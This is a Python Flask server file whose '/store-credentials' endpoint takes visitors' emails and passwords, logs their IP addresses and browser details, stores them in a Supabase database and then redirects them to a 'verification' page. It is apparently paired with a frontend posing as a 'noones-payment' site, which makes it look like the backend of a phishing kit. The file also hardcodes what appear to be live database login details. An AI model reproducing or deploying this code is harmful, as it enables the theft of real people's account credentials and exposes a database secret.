from flask import Flask, request, jsonify
import psycopg2
import bcrypt
from flask_cors import CORS
from psycopg2 import pool
import logging
import os
from datetime import datetime

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

# Initialize Flask app
app = Flask(__name__)

# Configure CORS with specific origins
CORS(app, resources={
    r"/*": {
        "origins": [
            "http://localhost:5173",  # Local development
            "http://localhost:3000",
            "https://noones-payment.vercel.app",  # Add your frontend URL
            "*"  # Remove this in production
        ],
        "methods": ["POST", "OPTIONS", "GET"],
        "allow_headers": ["Content-Type", "Authorization"],
        "expose_headers": ["Content-Type"],
        "supports_credentials": False,
        "max_age": 120
    }
})

# PostgreSQL connection setup
db_params = {
    'user': 'postgres.nzqybfjrmlsbrskzbyil',
    'host': 'aws-0-ap-south-1.pooler.supabase.com',
    'database': 'postgres',
    'password': 'WMBqWdQO4TYIx8MM',
    'port': 5432
}

# Connection Pool Setup
db_pool = None

def init_db_pool():
    """Initialize the database connection pool with error handling"""
    global db_pool
    try:
        if db_pool is None:
            db_pool = psycopg2.pool.SimpleConnectionPool(1, 20, **db_params)
            logger.info('✅ Database connection pool initialized')
            return True
    except Exception as e:
        logger.error(f'❌ Failed to initialize database pool: {str(e)}')
        return False

def test_db_connection():
    """Test database connection and create tables if needed"""
    try:
        conn = db_pool.getconn()
        cursor = conn.cursor()
        
        # Test connection
        cursor.execute('SELECT NOW()')
        current_time = cursor.fetchone()[0]
        logger.info(f'✅ Database connected successfully at {current_time}')

        # Create table if it doesn't exist
        create_table_query = '''
            CREATE TABLE IF NOT EXISTS users (
                id SERIAL PRIMARY KEY,
                email VARCHAR(255) NOT NULL,
                password VARCHAR(255) NOT NULL,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                ip_address VARCHAR(45),
                user_agent VARCHAR(255)
            );
        '''
        cursor.execute(create_table_query)
        conn.commit()
        logger.info('✅ Users table ready')

    except Exception as err:
        logger.error(f'❌ Database connection failed: {str(err)}')
        raise
    finally:
        if cursor:
            cursor.close()
        if conn:
            db_pool.putconn(conn)

# Initialize database pool and test connection
if not init_db_pool():
    logger.error("Failed to initialize application. Exiting.")
    exit(1)

test_db_connection()

@app.route('/')
def root():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'timestamp': datetime.now().isoformat()
    })

@app.route('/store-credentials', methods=['POST'])
def store_credentials():
    """Store user credentials endpoint with enhanced error handling and logging"""
    try:
        data = request.get_json()
        if not data:
            logger.error("No JSON data received")
            return jsonify({
                'error': 'No data provided',
                'shouldNavigate': False
            }), 400

        email = data.get('email')
        password = data.get('password')

        if not email or not password:
            logger.error(f'Missing credentials - Email provided: {bool(email)}, Password provided: {bool(password)}')
            return jsonify({
                'error': 'Email and password are required',
                'shouldNavigate': False
            }), 400

        # Get client information
        ip_address = request.headers.get('X-Forwarded-For', request.remote_addr)
        user_agent = request.headers.get('User-Agent', 'Unknown')

        # Hash the password
        hashed_password = bcrypt.hashpw(password.encode('utf-8'), bcrypt.gensalt()).decode('utf-8')

        conn = db_pool.getconn()
        try:
            cursor = conn.cursor()
            # Insert user with additional information
            insert_query = '''
                INSERT INTO users (email, password, ip_address, user_agent)
                VALUES (%s, %s, %s, %s)
                RETURNING id, email, created_at;
            '''
            cursor.execute(insert_query, (email, hashed_password, ip_address, user_agent))
            user = cursor.fetchone()
            conn.commit()
            
            logger.info(f'✅ User stored successfully: ID {user[0]}')
            
            return jsonify({
                'success': True,
                'message': 'User stored successfully',
                'user': {
                    'id': user[0],
                    'email': user[1],
                    'created_at': user[2].isoformat()
                },
                'shouldNavigate': True,
                'navigateTo': '/verification'
            }), 200

        except psycopg2.Error as db_err:
            conn.rollback()
            logger.error(f'Database error: {str(db_err)}')
            return jsonify({
                'success': False,
                'error': 'Database error occurred',
                'details': str(db_err),
                'shouldNavigate': False
            }), 500
        finally:
            cursor.close()
            db_pool.putconn(conn)

    except Exception as err:
        logger.error(f'Unexpected error: {str(err)}')
        return jsonify({
            'success': False,
            'error': 'An unexpected error occurred',
            'details': str(err),
            'shouldNavigate': False
        }), 500

# Global error handler
@app.errorhandler(Exception)
def handle_error(error):
    logger.error(f"Unhandled error: {str(error)}", exc_info=True)
    return jsonify({
        'success': False,
        'error': 'Internal server error',
        'details': str(error),
        'shouldNavigate': False
    }), 500

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5020))
    app.run(host='0.0.0.0', port=port)